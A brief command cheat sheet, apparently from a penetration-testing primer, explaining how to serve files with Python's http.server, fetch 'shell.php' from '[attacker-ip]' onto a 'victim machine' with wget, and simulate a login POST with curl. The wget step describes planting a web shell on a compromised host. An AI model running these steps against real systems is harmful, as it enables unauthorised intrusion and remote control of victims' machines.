python3 -m http.server 80: The "Instant Web Server."

Use Case: You are on your attack machine. You want to send a script to the victim. Run this command in the folder where the script is.

wget [URL]: The "Downloader."

Use Case: On the victim machine, type wget http://[attacker-ip]/shell.php to grab the file.

curl: Interacting with URLs.

Example: curl -X POST -d "password=123" http://site.com/login (Simulating a login attempt).